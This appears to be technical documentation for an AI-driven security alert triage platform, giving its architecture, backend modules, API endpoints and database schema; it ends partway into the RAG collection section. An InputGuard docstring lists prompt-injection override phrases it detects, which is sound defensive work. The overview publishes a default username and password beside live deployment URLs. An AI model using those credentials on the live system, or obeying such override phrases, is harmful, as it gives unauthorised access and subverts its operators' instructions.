# AI-SOC Watchdog - Complete Project Documentation

## Table of Contents
1. [Project Overview](#project-overview)
2. [Technology Stack](#technology-stack)
3. [Architecture](#architecture)
4. [Backend Modules](#backend-modules)
5. [Frontend Components](#frontend-components)
6. [API Endpoints](#api-endpoints)
7. [Database Schema](#database-schema)
8. [RAG System](#rag-system)
9. [AI Analysis Pipeline](#ai-analysis-pipeline)
10. [Security Features](#security-features)
11. [Deployment](#deployment)
12. [Authentication](#authentication)

---

## Project Overview

**AI-SOC Watchdog** is a production-ready, AI-powered Security Operations Center (SOC) platform that automates security alert triage using Claude AI with Retrieval-Augmented Generation (RAG). The system ingests security alerts from SIEM systems, enriches them with contextual knowledge, performs AI-driven analysis, and provides full transparency into the AI's decision-making process.

### Key Features
- **Automated Alert Triage:** AI classifies alerts as MALICIOUS, SUSPICIOUS, or BENIGN
- **RAG-Enhanced Analysis:** 7 ChromaDB collections provide expert-level context
- **AI Transparency:** Full proof of AI reasoning with verification scores
- **Real-time Monitoring:** Live debug dashboard showing all system operations
- **Priority Queuing:** Critical alerts processed before low-severity ones
- **MITRE ATT&CK Integration:** Automatic technique mapping and enrichment

### Live URLs
- **Frontend Dashboard:** https://llm-watchdog-prototype.vercel.app
- **Backend API:** https://llm-watchdog-prototype-production.up.railway.app
- **Repository:** https://github.com/karanam61/LLM-watchdog-prototype

### Default Credentials
- **Username:** `analyst`
- **Password:** `watchdog123`

---

## Technology Stack

### Backend
| Component | Technology | Purpose |
|-----------|------------|---------|
| Web Framework | Flask 2.x + Flask-SocketIO | REST API + WebSocket support |
| AI Model | Anthropic Claude (claude-3-5-sonnet, claude-sonnet-4) | Alert analysis and reasoning |
| Vector Database | ChromaDB | RAG knowledge retrieval |
| Primary Database | Supabase (PostgreSQL) | Alert storage, logs, metrics |
| Task Queue | Custom ThreadPoolExecutor | Background alert processing |
| Caching | In-memory LRU with TTL | Fast API responses |

### Frontend
| Component | Technology | Purpose |
|-----------|------------|---------|
| Framework | React 18 + Vite | Single-page application |
| Styling | TailwindCSS | Utility-first CSS with custom theme |
| Charts | Recharts | Data visualization |
| Real-time | Socket.IO Client | Live updates |
| HTTP Client | Axios | API communication with 2-min timeout |
| Icons | Lucide React | Consistent iconography |

### Infrastructure
| Component | Technology | Purpose |
|-----------|------------|---------|
| Backend Hosting | Railway | Containerized Flask deployment |
| Frontend Hosting | Vercel | Static React deployment |
| Database | Supabase Cloud | Managed PostgreSQL |
| CI/CD | GitHub Actions → Auto-deploy | Continuous deployment |
| Backup | AWS S3 | Database failover storage |

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              SIEM / Security Tools                          │
│                    (Splunk, QRadar, Elastic SIEM, etc.)                     │
└─────────────────────────────────────────────────────────────────────────────┘
                                       │
                                       ▼ POST /ingest (with X-Ingest-Key header)
┌─────────────────────────────────────────────────────────────────────────────┐
│                           Flask Backend (Railway)                            │
│                                                                              │
│  ┌──────────────────────────────────────────────────────────────────────┐   │
│  │                         INGESTION LAYER                               │   │
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  │   │
│  │  │   Ingest    │→ │   Parser    │→ │  Severity   │→ │   Queue     │  │   │
│  │  │   API       │  │   Module    │  │  Classifier │  │   Manager   │  │   │
│  │  │             │  │             │  │             │  │ (Pri/Std)   │  │   │
│  │  └─────────────┘  └─────────────┘  └─────────────┘  └─────────────┘  │   │
│  └──────────────────────────────────────────────────────────────────────┘   │
│                                       │                                      │
│                                       ▼                                      │
│  ┌──────────────────────────────────────────────────────────────────────┐   │
│  │                      AI ANALYSIS PIPELINE                             │   │
│  │                                                                       │   │
│  │  Phase 1: Security Gates                                              │   │
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐                   │   │
│  │  │ InputGuard  │→ │  Validator  │→ │ DataProtect │                   │   │
│  │  │ (Injection) │  │ (Pydantic)  │  │ (PII Mask)  │                   │   │
│  │  └─────────────┘  └─────────────┘  └─────────────┘                   │   │
│  │                                                                       │   │
│  │  Phase 2: Context Building                                            │   │
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐                   │   │
│  │  │ RAG System  │→ │ Log Query   │→ │ OSINT       │                   │   │
│  │  │ (7 colls)   │  │ (4 tables)  │  │ Enrichment  │                   │   │
│  │  └─────────────┘  └─────────────┘  └─────────────┘                   │   │
│  │                                                                       │   │
│  │  Phase 3: AI Analysis                                                 │   │
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐                   │   │
│  │  │ Budget      │→ │ Claude API  │→ │ Response    │                   │   │
│  │  │ Tracker     │  │ (Resilient) │  │ Parser      │                   │   │
│  │  └─────────────┘  └─────────────┘  └─────────────┘                   │   │
│  │                                                                       │   │
│  │  Phase 4: Output Validation                                           │   │
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐                   │   │
│  │  │ OutputGuard │→ │ Schema      │→ │ Database    │                   │   │
│  │  │ (Sanitize)  │  │ Validation  │  │ Update      │                   │   │
│  │  └─────────────┘  └─────────────┘  └─────────────┘                   │   │
│  └──────────────────────────────────────────────────────────────────────┘   │
│                                                                              │
│  ┌──────────────────────────────────────────────────────────────────────┐   │
│  │                       DATA LAYER                                      │   │
│  │  ┌─────────────────────────┐  ┌─────────────────────────┐            │   │
│  │  │       Supabase          │  │       ChromaDB          │            │   │
│  │  │  ┌─────────────────┐    │  │  ┌─────────────────┐    │            │   │
│  │  │  │ alerts          │    │  │  │ mitre_severity  │    │            │   │
│  │  │  │ process_logs    │    │  │  │ historical_alerts│   │            │   │
│  │  │  │ network_logs    │    │  │  │ business_rules  │    │            │   │
│  │  │  │ file_activity   │    │  │  │ attack_patterns │    │            │   │
│  │  │  │ windows_events  │    │  │  │ detection_rules │    │            │   │
│  │  │  └─────────────────┘    │  │  │ detection_sigs  │    │            │   │
│  │  └─────────────────────────┘  │  │ company_infra   │    │            │   │
│  │                                │  └─────────────────┘    │            │   │
│  │                                └─────────────────────────┘            │   │
│  └──────────────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────────┘
                                       │
                                       ▼ REST API + WebSocket
┌─────────────────────────────────────────────────────────────────────────────┐
│                          React Frontend (Vercel)                             │
│                                                                              │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐ │
│  │  Analyst    │  │    RAG      │  │    AI       │  │   Performance       │ │
│  │  Dashboard  │  │ Visualization│ │Transparency │  │    Metrics          │ │
│  └─────────────┘  └─────────────┘  └─────────────┘  └─────────────────────┘ │
│                                                                              │
│  ┌─────────────┐  ┌─────────────────────────────────────────────────────┐   │
│  │   Debug     │  │                    Sidebar Navigation                │   │
│  │  Dashboard  │  │  (Dashboard | RAG | Transparency | Performance | Debug) │
│  └─────────────┘  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Backend Modules

### 1. Core Module (`backend/core/`)

#### `parser.py` - Alert Parser
**Purpose:** Normalize incoming alerts from various SIEM formats into a standard structure.

**Functions:**
```python
def parse_alert(raw_data: dict) -> dict:
    """
    Parse raw alert data into normalized format.
    
    Input: Raw JSON from SIEM
    Output: {
        'alert_name': str,
        'description': str,
        'severity': str,  # critical/high/medium/low
        'hostname': str,
        'username': str,
        'source_ip': str,
        'dest_ip': str,
        'mitre_technique': str,  # T####.###
        'timestamp': str  # ISO format
    }
    """

def normalize_severity(value: str) -> str:
    """
    Convert various severity formats to standard.
    Maps: 'crit'→'critical', '1'→'critical', 'high'→'high', etc.
    """

def extract_mitre_technique(text: str) -> str:
    """
    Regex extraction of MITRE ATT&CK technique IDs.
    Pattern: T[0-9]{4}(\.[0-9]{3})?
    Example: "T1003.001" (Credential Dumping via LSASS)
    """
```

#### `Severity.py` - Severity Classification
**Purpose:** Classify alerts into priority queues based on severity and MITRE technique.

**Class: `SeverityClassifier`**
```python
class SeverityClassifier:
    """
    Determines if alert requires priority processing.
    
    CRITICAL_HIGH triggers:
    - severity = 'critical' or 'high'
    - MITRE techniques: T1003 (Credential Access), T1059 (Command Execution),
      T1486 (Data Encrypted for Impact/Ransomware), T1547 (Boot Persistence)
    
    MEDIUM_LOW:
    - Everything else (routine alerts)
    """
    
    def classify(self, alert: dict) -> str:
        """Returns 'CRITICAL_HIGH' or 'MEDIUM_LOW'"""
```

#### `Queue_manager.py` - Alert Queue Management
**Purpose:** Thread-safe priority queue system for alert processing.

**Class: `QueueManager`**
```python
class QueueManager:
    """
    Manages two queues:
    - priority_queue: Critical/high severity alerts (processed first)
    - standard_queue: Medium/low severity alerts
    
    Background worker thread continuously processes queues.
    Priority queue always emptied before standard queue.
    """
    
    def add_to_queue(self, alert: dict, severity_class: str):
        """Add alert to appropriate queue based on classification"""
    
    def process_queue(self):
        """Background worker - processes priority queue first, then standard"""
    
    def get_queue_status(self) -> dict:
        """Returns {'priority_queue': int, 'standard_queue': int, 'processing': bool}"""
```

#### `mitre_mapping.py` - MITRE ATT&CK Mapping
**Purpose:** Map alert keywords to MITRE ATT&CK techniques.

**Functions:**
```python
def map_to_mitre(alert_name: str, description: str) -> dict:
    """
    Maps alert content to MITRE ATT&CK framework.
    
    Returns: {
        'technique_id': 'T1003.001',
        'technique_name': 'LSASS Memory',
        'tactic': 'Credential Access',
        'severity_weight': 0.95
    }
    
    Uses keyword matching against 50+ common attack patterns.
    """
```

---

### 2. AI Module (`backend/ai/`)

#### `alert_analyzer_final.py` - Main AI Pipeline
**Purpose:** Orchestrates the complete 6-phase AI analysis pipeline.

**Class: `AlertAnalyzer`**
```python
class AlertAnalyzer:
    """
    The Heart of AI-SOC Watchdog
    
    Orchestrates 26 security features across 6 phases:
    
    Phase 1: Security Gates (Features 1-4, 6-8, 14-17)
    - Input validation and sanitization
    - Prompt injection detection
    - PII masking
    
    Phase 2: Optimization (Features 5, 22)
    - Budget tracking
    - Request deduplication
    
    Phase 3: Context Building (RAG + Logs)
    - Query 7 ChromaDB collections
    - Fetch correlated logs from 4 tables
    - OSINT enrichment for IPs/domains
    
    Phase 4: AI Analysis (Features 9-13)
    - Claude API with retry logic
    - Rate limiting
    - Timeout handling
    - Fallback responses
    
    Phase 5: Output Validation (Features 3-4, 7-8)
    - Response sanitization
    - Schema validation
    - Verdict normalization
    
    Phase 6: Observability (Features 18-21)
    - Audit logging
    - Metrics collection
    - Health monitoring
    """
    
    def __init__(self, config: dict = None):
        """Initialize all 26 feature components"""
    
    async def analyze_alert(self, alert: dict) -> dict:
        """
        Main entry point for alert analysis.
        
        Input: Normalized alert dict
        Output: {
            'verdict': 'malicious' | 'suspicious' | 'benign',
            'confidence': float (0.0-1.0),
            'reasoning': str (detailed explanation),
            'evidence': list[str] (specific observations),
            'recommendation': str (suggested actions),
            'chain_of_thought': list[str] (step-by-step reasoning)
        }
        """
```

#### `rag_system.py` - RAG Knowledge Retrieval
**Purpose:** Query ChromaDB collections to build expert context for AI analysis.

**Class: `RAGSystem`**
```python
class RAGSystem:
    """
    Retrieval-Augmented Generation System
    
    Queries 7 ChromaDB collections to provide expert-level context:
    
    1. mitre_severity - MITRE ATT&CK technique descriptions, severity scores
    2. historical_analyses - Past alert outcomes with analyst decisions
    3. business_rules - Organization-specific policies and escalation rules
    4. attack_patterns - Known attack indicators and IOCs
    5. detection_rules - SIEM correlation rules
    6. detection_signatures - Behavioral detection patterns
    7. company_infrastructure - Asset context (high-value targets, departments)
    """
    
    def query_mitre_info(self, technique_id: str) -> dict:
        """
        Query MITRE technique information.
        Returns: {
            'found': bool,
            'content': str,  # Technique description
            'severity': str,
            'tactic': str
        }
        """
    
    def query_historical_alerts(self, alert_name: str, mitre_technique: str, n_results: int = 3) -> dict:
        """
        Find similar past alerts with analyst decisions.
        Returns: {
            'found': bool,
            'count': int,
            'analyses': list[str]  # Past analyst notes and verdicts
        }
        """
    
    def query_business_rules(self, department: str, severity: str) -> dict:
        """
        Get organization-specific handling rules.
        Returns: {
            'found': bool,
            'rules': list[str],
            'escalation_threshold': str
        }
        """
    
    def query_attack_patterns(self, indicators: list) -> dict:
        """Query known attack pattern database"""
    
    def query_detection_signatures(self, alert_name: str) -> dict:
        """Query behavioral detection signatures"""
    
    def query_asset_context(self, hostname: str, username: str) -> dict:
        """Get asset criticality and user role context"""
    
    def build_context(self, alert: dict) -> str:
        """
        Build complete RAG context for Claude.
        Combines all 7 sources into a structured prompt section.
        Returns: Formatted context string (typically 3000-8000 chars)
        """
```

#### `security_guard.py` - Input/Output Security
**Purpose:** Protect against prompt injection and sanitize AI outputs.

**Classes:**
```python
class InputGuard:
    """
    Detects and blocks prompt injection attempts.
    
    Checks for:
    - Instruction override attempts ("ignore previous instructions")
    - Role manipulation ("you are now...")
    - Jailbreak patterns
    - Encoded payloads (base64, hex)
    - Excessive special characters
    """
    
    def validate(self, text: str) -> tuple[bool, str]:
        """Returns (is_safe, reason)"""

class OutputGuard:
    """
    Sanitizes AI responses before storage/display.
    
    Removes:
    - Potential XSS payloads
    - SQL injection attempts
    - Markdown injection
    - Executable code blocks
    """
    
    def sanitize(self, response: str) -> str:
        """Returns sanitized response"""
```

#### `validation.py` - Pydantic Schemas
**Purpose:** Strict input/output validation using Pydantic models.

**Classes:**
```python
class AlertInput(BaseModel):
    """
    Validated alert structure for AI analysis.
    
    Required fields:
    - alert_id: str (UUID)
    - alert_name: str
    
    Optional fields with defaults:
    - mitre_technique: str = "T0000.000"
    - severity: str = "medium"
    - hostname: str = "unknown-host"
    - username: str = "unknown-user"
    - description: str = "No description provided"
    - source_ip: Optional[str]
    - dest_ip: Optional[str]
    """

class AlertAnalysis(BaseModel):
    """
    Validated AI analysis output.
    
    Required fields:
    - verdict: Literal["malicious", "benign", "suspicious", "error"]
    - confidence: float (0.0-1.0)
    - evidence: list[str]
    - reasoning: str
    - recommendation: str
    """
```

#### `api_resilience.py` - Claude API Client
**Purpose:** Resilient API client with retry logic, rate limiting, and fallbacks.

**Class: `ClaudeAPIClient`**
```python
class ClaudeAPIClient:
    """
    Resilient Claude API wrapper implementing Features 9-13.
    
    Features:
    - Automatic retry with exponential backoff (3 attempts)
    - Rate limiting (respects Anthropic limits)
    - Configurable timeout (25 seconds default)
    - Fallback to rule-based classification if API fails
    - Token counting and cost tracking
    """
    
    def analyze_with_resilience(self, prompt: str, alert: dict) -> dict:
        """
        Send analysis request with full resilience.
        
        Retry strategy:
        - Attempt 1: Immediate
        - Attempt 2: Wait 2 seconds
        - Attempt 3: Wait 4 seconds
        - Fallback: Rule-based classification
        
        Returns: {
            'verdict': str,
            'confidence': float,
            'reasoning': str,
            'evidence': list,
            'tokens_used': int,
            'cost': float
        }
        """
```

#### `dynamic_budget_tracker.py` - Cost Management
**Purpose:** Track and limit daily AI API costs.

**Class: `DynamicBudgetTracker`**
```python
class DynamicBudgetTracker:
    """
    Tracks Claude API usage and enforces daily budget limits.
    
    Default daily limit: $2.00
    
    Tracks:
    - Input tokens used
    - Output tokens used
    - Total cost (based on Claude pricing)
    - Requests per day
    
    When budget exceeded:
    - Returns cached responses if available
    - Falls back to rule-based classification
    - Logs budget exhaustion event
    """
    
    def can_make_request(self) -> bool:
        """Check if budget allows another request"""
    
    def record_usage(self, input_tokens: int, output_tokens: int):
        """Record token usage and update cost"""
    
    def get_remaining_budget(self) -> float:
        """Returns remaining daily budget in dollars"""
```

#### `data_protection.py` - PII Handling
**Purpose:** Mask sensitive data before sending to AI.

**Class: `DataProtectionGuard`**
```python
class DataProtectionGuard:
    """
    Masks PII/sensitive data in alert content.
    
    Masks:
    - Credit card numbers → [CARD-XXXX]
    - SSN → [SSN-REDACTED]
    - Email addresses → [EMAIL-HASH]
    - Phone numbers → [PHONE-REDACTED]
    - IP addresses → Optionally masked
    
    Maintains mapping for post-analysis restoration if needed.
    """
    
    def mask_pii(self, text: str) -> tuple[str, dict]:
        """Returns (masked_text, mapping_for_restoration)"""
```

#### `observability.py` - Monitoring Components
**Purpose:** Audit logging, metrics collection, and health monitoring.

**Classes:**
```python
class AuditLogger:
    """
    Logs all AI decisions for compliance and debugging.
    
    Log entries include:
    - Timestamp
    - Alert ID
    - Input hash (for reproducibility)
    - AI verdict and confidence
    - Tokens used
    - Processing time
    - Any errors encountered
    """

class MetricsCollector:
    """
    Collects performance metrics.
    
    Metrics tracked:
    - Processing time per alert
    - Tokens used (input/output)
    - AI cost per request
    - Queue wait times
    - Cache hit rates
    - Error rates
    """

class HealthMonitor:
    """
    Monitors system health.
    
    Checks:
    - Database connectivity
    - ChromaDB availability
    - Claude API status
    - Queue processor status
    - Memory usage
    - CPU usage
    """
```

---

### 3. Storage Module (`backend/storage/`)

#### `database.py` - Supabase Client
**Purpose:** Database operations for alerts, logs, and metrics.

**Functions:**
```python
# Connection
supabase = create_client(SUPABASE_URL, SUPABASE_KEY)

# Alert Operations
def create_alert(alert_data: dict) -> str:
    """Insert new alert, returns alert_id"""

def update_alert_analysis(alert_id: str, analysis: dict):
    """Update alert with AI analysis results"""

def get_alert(alert_id: str) -> dict:
    """Fetch single alert by ID"""

def get_alerts(page: int, per_page: int, filters: dict) -> dict:
    """Paginated alert listing with filters"""

# Log Operations
def query_process_logs(alert_id: str) -> list:
    """Get process execution logs for alert"""

def query_network_logs(alert_id: str) -> list:
    """Get network connection logs for alert"""

def query_file_activity_logs(alert_id: str) -> list:
    """Get file system activity logs for alert"""

def query_windows_event_logs(alert_id: str) -> list:
    """Get Windows event logs for alert"""
```

#### `s3_failover.py` - Backup System
**Purpose:** Backup critical data to S3 for disaster recovery.

**Functions:**
```python
def backup_to_s3(data: dict, key: str):
    """Backup JSON data to S3 bucket"""

def restore_from_s3(key: str) -> dict:
    """Restore data from S3 backup"""

def sync_alerts_to_s3():
    """Periodic sync of alerts table to S3"""
```

---

### 4. Monitoring Module (`backend/monitoring/`)

#### `live_logger.py` - Real-time Operation Logging
**Purpose:** Capture all system operations for debug dashboard.

**Class: `LiveLogger`**
```python
class LiveLogger:
    """
    Captures every operation for real-time debugging.
    
    Categories:
    - API: HTTP request/response
    - WORKER: Background task execution
    - FUNCTION: Function calls
    - AI: Claude API interactions
    - RAG: Knowledge retrieval queries
    - DATABASE: Database operations
    - QUEUE: Queue management events
    - SECURITY: Security checks and validations
    - ERROR: Errors and exceptions
    
    Each entry includes:
    - timestamp: Unix timestamp
    - datetime: ISO formatted
    - category: Operation category
    - operation: What happened
    - details: Dict with parameters and results
    - status: success/warning/error
    - duration: Execution time if applicable
    - explanation: Human-readable description
    """
    
    def log(self, category: str, operation: str, details: dict, 
            status: str = 'success', duration: float = None):
        """Log an operation"""
    
    def get_recent(self, limit: int = 100, category: str = None) -> list:
        """Get recent operations, optionally filtered by category"""
```

#### `rag_api.py` - RAG Dashboard API
**Purpose:** API endpoints for RAG visualization dashboard.

**Endpoints:**
```python
@rag_monitoring_bp.route('/api/rag/usage/<alert_id>')
def get_rag_usage_for_alert(alert_id):
    """
    Get RAG usage details for a specific alert.
    
    Returns: {
        'alert_id': str,
        'alert_name': str,
        'sources_queried': list,
        'queries': list[{'source': str, 'count': int, 'found': bool}],
        'retrieved_by_source': dict,
        'total_documents_retrieved': int,
        'total_query_time': float,
        'stats': {'total_sources': int, 'sources_found': int}
    }
    """

@rag_monitoring_bp.route('/api/rag/stats')
def get_rag_stats():
    """
    Get aggregate RAG statistics.
    
    Returns: {
        'total_queries': int,
        'avg_query_time': float,
        'cache_hit_rate': float,
        'query_distribution': dict,
        'total_alerts': int
    }
    """

@rag_monitoring_bp.route('/api/rag/collections/status')
def get_collection_status():
    """
    Get health status of all ChromaDB collections.
    
    Returns: {
        'collections': [
            {'name': str, 'status': str, 'document_count': int}
        ]
    }
    """
```

#### `transparency_api.py` - AI Transparency Dashboard API
**Purpose:** API endpoints for AI decision verification.

**Endpoints:**
```python
@transparency_bp.route('/api/transparency/proof/<alert_id>')
def get_transparency_proof(alert_id):
    """
    Generate proof that AI analyzed this alert legitimately.
    
    Returns: {
        'alert_id': str,
        'alert_name': str,
        'verification': {
            'verification_score': float (0-100),
            'final_verdict': str,
            'facts_found': list[str],
            'missing_facts': list[str],
            'rag_usage': list[str]
        },
        'alert_data': dict,
        'ai_analysis': {
            'verdict': str,
            'confidence': float,
            'reasoning': str,
            'evidence': list,
            'chain_of_thought': list
        },
        'correlated_logs': {
            'network': list,
            'process': list,
            'file': list
        },
        'rag_sources': dict,
        'log_counts': dict
    }
    """

@transparency_bp.route('/api/transparency/summary')
def get_transparency_summary():
    """
    Get aggregate transparency statistics.
    
    Returns: {
        'total_analyzed': int,
        'avg_verification_score': float,
        'verdict_distribution': dict,
        'confidence_distribution': dict
    }
    """
```

#### `system_monitor.py` - System Health API
**Purpose:** API endpoints for system performance monitoring.

**Endpoints:**
```python
@monitoring_bp.route('/api/monitoring/metrics/dashboard')
def get_dashboard_metrics():
    """
    Get all metrics for performance dashboard.
    
    Returns: {
        'system_metrics': {
            'cpu_percent': float,
            'memory_percent': float,
            'memory_used_gb': float
        },
        'ai_metrics': {
            'total_requests': int,
            'total_cost': float,
            'avg_processing_time': float,
            'total_input_tokens': int,
            'total_output_tokens': int
        },
        'alert_stats': {
            'total_processed': int,
            'pending_queue': int,
            'by_verdict': dict
        },
        'rag_stats': {
            'total_queries': int,
            'avg_query_time': float
        },
        'budget': {
            'daily_limit': float,
            'spent': float,
            'remaining': float
        },
        'uptime_seconds': int
    }
    """

@monitoring_bp.route('/api/monitoring/logs/recent')
def get_recent_logs():
    """
    Get recent operation logs for debug dashboard.
    
    Query params:
    - category: Filter by category (AI, RAG, QUEUE, etc.)
    - search: Text search in operations
    - limit: Max results (default 200)
    
    Returns: {
        'operations': list[LogEntry],
        'count': int,
        'categories': list[str]
    }
    """
```

---

## Frontend Components

### Pages (`soc-dashboard/src/pages/`)

#### `AnalystDashboard.jsx` - Main Alert Dashboard
**Purpose:** Primary interface for security analysts to review alerts.

**Features:**
- Paginated alert list with verdict badges (MALICIOUS/SUSPICIOUS/BENIGN)
- Alert detail panel with full AI analysis
- Re-analyze button for ERROR alerts
- Filtering by severity, verdict, status
- Real-time updates via polling

**API Calls:**
- `GET /alerts?page=X&per_page=20` - Fetch alert list
- `POST /api/alerts/{id}/reanalyze` - Trigger re-analysis

#### `RAGDashboard.jsx` - RAG Visualization
**Purpose:** Visualize how RAG knowledge is used in AI analysis.

**Features:**
- Knowledge base collection stats (bar chart)
- Query distribution by source (pie chart)
- Collection health status grid
- Per-alert RAG usage details
- Document retrieval scores

**API Calls:**
- `GET /api/rag/stats` - Aggregate statistics
- `GET /api/rag/collections/status` - Collection health
- `GET /api/rag/usage/{alert_id}` - Per-alert RAG data

#### `TransparencyDashboard.jsx` - AI Proof Dashboard
**Purpose:** Prove AI analysis is legitimate, not templated.

**Features:**
- Verification score display (0-100%)
- Facts found/missing list
- RAG sources used
- Full AI reasoning display
- Evidence list
- Correlated logs viewer

**API Calls:**
- `GET /api/transparency/summary` - Aggregate stats
- `GET /api/transparency/proof/{alert_id}` - Per-alert proof

#### `PerformanceDashboard.jsx` - System Metrics
**Purpose:** Real-time system performance monitoring.

**Features:**
- CPU/Memory usage gauges
- AI cost tracker
- Uptime counter
- Alerts processed counter
- Processing time charts
- Error log viewer

**API Calls:**
- `GET /api/monitoring/metrics/dashboard` - All metrics
- `GET /api/monitoring/metrics/history?hours=24` - Historical data
- `GET /api/monitoring/metrics/errors` - Recent errors

#### `DebugDashboard.jsx` - Live Debug Console
**Purpose:** Real-time operation log viewer for debugging.

**Features:**
- Live log streaming (1-second polling)
- Category filtering (AI, RAG, QUEUE, SECURITY, etc.)
- Text search
- Pause/resume
- Auto-scroll toggle
- Color-coded status (success/warning/error)
- Expandable log details with JSON viewer

**API Calls:**
- `GET /api/monitoring/logs/recent?category=X&limit=200` - Fetch logs
- `GET /api/monitoring/logs/categories` - Available categories

### Components (`soc-dashboard/src/components/`)

#### `Sidebar.jsx` - Navigation
**Purpose:** Main navigation sidebar.

**Links:**
- Dashboard (Analyst view)
- RAG Visualization
- AI Transparency
- Performance
- Debug

#### `LoginPage.jsx` - Authentication
**Purpose:** Session-based login form.

**Features:**
- Username/password form
- Error display
- Session cookie management

### Utilities (`soc-dashboard/src/utils/`)

#### `api.js` - Axios Client
```javascript
const api = axios.create({
    baseURL: import.meta.env.VITE_API_URL || 'http://localhost:5000',
    headers: { 'Content-Type': 'application/json' },
    withCredentials: false,
    timeout: 120000  // 2 minute timeout for slow RAG queries
});
```

---

## API Endpoints Summary

### Alert Management
| Method | Endpoint | Purpose |
|--------|----------|---------|
| POST | `/ingest` | Receive new alert from SIEM |
| GET | `/alerts` | List alerts (paginated) |
| GET | `/alerts/{id}` | Get single alert details |
| POST | `/api/alerts/{id}/reanalyze` | Trigger re-analysis |

### RAG System
| Method | Endpoint | Purpose |
|--------|----------|---------|
| GET | `/api/rag/usage/{alert_id}` | RAG usage for specific alert |
| GET | `/api/rag/stats` | Aggregate RAG statistics |
| GET | `/api/rag/collections/status` | Collection health status |

### AI Transparency
| Method | Endpoint | Purpose |
|--------|----------|---------|
| GET | `/api/transparency/proof/{alert_id}` | Verification proof for alert |
| GET | `/api/transparency/summary` | Aggregate transparency stats |

### Monitoring
| Method | Endpoint | Purpose |
|--------|----------|---------|
| GET | `/api/monitoring/metrics/dashboard` | All system metrics |
| GET | `/api/monitoring/metrics/history` | Historical metrics |
| GET | `/api/monitoring/metrics/errors` | Recent errors |
| GET | `/api/monitoring/logs/recent` | Debug logs |
| GET | `/api/monitoring/logs/categories` | Log categories |

### System
| Method | Endpoint | Purpose |
|--------|----------|---------|
| GET | `/health` | Health check (Railway) |
| GET | `/api/health` | Detailed health status |
| POST | `/login` | Authenticate user |
| POST | `/logout` | End session |

---

## Database Schema (Supabase)

### `alerts` Table
```sql
CREATE TABLE alerts (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    alert_name TEXT NOT NULL,
    description TEXT,
    severity TEXT DEFAULT 'medium',
    severity_class TEXT,  -- 'CRITICAL_HIGH' or 'MEDIUM_LOW'
    hostname TEXT,
    username TEXT,
    source_ip TEXT,
    dest_ip TEXT,
    mitre_technique TEXT,
    
    -- AI Analysis Results
    ai_verdict TEXT,      -- 'malicious', 'suspicious', 'benign', 'error'
    ai_confidence FLOAT,  -- 0.0 to 1.0
    ai_reasoning TEXT,    -- Full reasoning explanation
    ai_evidence TEXT[],   -- Array of evidence points
    ai_recommendation TEXT,
    ai_chain_of_thought TEXT[],
    
    -- Analyst Feedback
    analyst_verdict TEXT,
    analyst_notes TEXT,
    assigned_to TEXT,
    
    -- Status Tracking
    status TEXT DEFAULT 'open',  -- 'open', 'analyzing', 'analyzed', 'resolved'
    queued_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT NOW(),
    resolved_at TIMESTAMP,
    resolution_notes TEXT,
    
    timestamp TIMESTAMP  -- Original alert timestamp
);
```

### `process_logs` Table
```sql
CREATE TABLE process_logs (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    alert_id UUID REFERENCES alerts(id),
    process_name TEXT,
    parent_process TEXT,
    command_line TEXT,
    username TEXT,
    pid INTEGER,
    timestamp TIMESTAMP DEFAULT NOW()
);
```

### `network_logs` Table
```sql
CREATE TABLE network_logs (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    alert_id UUID REFERENCES alerts(id),
    source_ip TEXT,
    dest_ip TEXT,
    dest_port INTEGER,
    protocol TEXT,
    bytes_sent INTEGER,
    bytes_received INTEGER,
    timestamp TIMESTAMP DEFAULT NOW()
);
```

### `file_activity_logs` Table
```sql
CREATE TABLE file_activity_logs (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    alert_id UUID REFERENCES alerts(id),
    file_path TEXT,
    action TEXT,  -- 'CREATE', 'MODIFY', 'DELETE', 'READ'
    process_name TEXT,
    timestamp TIMESTAMP DEFAULT NOW()
);
```

### `windows_event_logs` Table
```sql
CREATE TABLE windows_event_logs (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    alert_id UUID REFERENCES alerts(id),
    event_id INTEGER,
    event_type TEXT,
    source TEXT,
    message TEXT,
    timestamp TIMESTAMP DEFAULT NOW()
);
```

---

## RAG System Details

### ChromaDB Collections

#### 1. `mitre_severity` Collection
**Purpose:** MITRE ATT&CK technique descriptions and severity scores.

**Document Structure:**
```
MITRE Technique: T1003.001
Name: LSASS Memory
Tactic: Credential Access
Severity: critical
Average Cost: $2,500,000
Damage Score: 95/100
Description: Adversaries may attempt to access credential material stored in LSASS...
Why Critical: Direct access to domain credentials enables full network compromise
```

**~200 documents covering major MITRE techniques**

#### 2. `historical_analyses` Collection
**Purpose:** Past alert analyses with analyst decisions for learning.

**Document Structure:**
```
Alert: PowerShell Fileless Execution
MITRE Technique: T1059.001
Severity: critical
Department: hr

AI Analysis: Critical fileless malware detected. Evidence: (1) PowerShell spawned 
from Microsoft Word, (2) ExecutionPolicy Bypass and WindowStyle Hidden flags...

Analyst Decision: True Positive
Analyst Notes: Confirmed Emotet variant. User opened malicious invoice.docx...

Actions Taken: Immediate network isolation, Collected PowerShell command history...
Business Impact: HR workstation compromised. Contained before data exfiltration.
Lessons Learned: Office macros should be disabled by default...
Resolution Time: 18 minutes
False Positive: False
```

**~50 historical case studies**

#### 3. `business_rules` Collection
**Purpose:** Organization-specific policies and escalation rules.

**Document Structure:**
```
Department: finance
Priority Level: critical
Justification: Handles wire transfers, payroll, financial reporting. 
Compromise could result in financial fraud.
Escalation Threshold: any suspicious activity
Typical Users: 4
High Value Target: True
Note: Extra scrutiny for after-hours activity
```

**Rules for: finance, hr, engineering, sales, executive, it**

#### 4. `attack_patterns` Collection
**Purpose:** Known attack patterns and indicators.

**Document Structure:**
```
Attack Pattern: HTTPS Exfiltration
